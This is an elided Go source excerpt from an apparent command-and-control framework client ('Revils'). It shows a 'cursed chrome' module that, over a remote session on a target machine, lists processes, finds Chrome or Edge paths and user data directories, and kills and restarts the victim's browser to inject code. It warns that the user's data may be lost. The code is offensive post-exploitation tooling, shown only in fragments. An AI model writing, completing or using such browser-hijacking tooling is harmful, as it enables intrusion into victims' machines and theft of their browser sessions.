...
import (
	...
	"github.com/Kevin-kitnick/revils/client/overlord"
	"github.com/Kevin-kitnick/revils/client/tcpproxy"
...
func CursedChromeCmd(ctx *grumble.Context, con *console.RevilsConsoleClient) {
...
func avadaKedavraChrome(session *clientpb.Session, ctx *grumble.Context, con *console.RevilsConsoleClient) *core.CursedProcess {
	...
	if chromeProcess != nil {
		...
		con.PrintWarnf("Revils will need to kill and restart the Chrome process in order to perform code injection.\n")
		con.PrintWarnf("Revils will attempt to restore the user's session, however %sDATA LOSS MAY OCCUR!%s\n", console.Bold, console.Normal)
		con.Printf("\n")
		confirm := false
		...
		terminateResp, err := con.Rpc.Terminate(context.Background(), &revilspb.TerminateReq{
...
func startCursedChromeProcess(isEdge bool, session *clientpb.Session, ctx *grumble.Context, con *console.RevilsConsoleClient) (*core.CursedProcess, error) {
	name := "Chrome"
	if isEdge {
		name = "Edge"
	}
	...
	chromeExec, err := con.Rpc.Execute(context.Background(), &revilspb.ExecuteReq{
		Request: con.ActiveTarget.Request(ctx),
		Path:    chromeExePath,
		Args:    args,
		Output:  false,
...
func findChromeUserDataDir(isEdge bool, session *clientpb.Session, ctx *grumble.Context, con *console.RevilsConsoleClient) (string, error) {
	...
	case "windows":
		...
		for _, driveLetter := range windowsDriveLetters {
			...
			ls, err := con.Rpc.Ls(context.Background(), &revilspb.LsReq{
				Request: con.ActiveTarget.Request(ctx),
				Path:    userDataDir,
			})
			if err != nil {
...
func findChromeExecutablePath(isEdge bool, session *clientpb.Session, ctx *grumble.Context, con *console.RevilsConsoleClient) (string, error) {
...
func getChromeProcess(session *clientpb.Session, ctx *grumble.Context, con *console.RevilsConsoleClient) (*commonpb.Process, error) {
	ps, err := con.Rpc.Ps(context.Background(), &revilspb.PsReq{
		Request: con.ActiveTarget.Request(ctx),
	})
	if err != nil {
		return nil, err
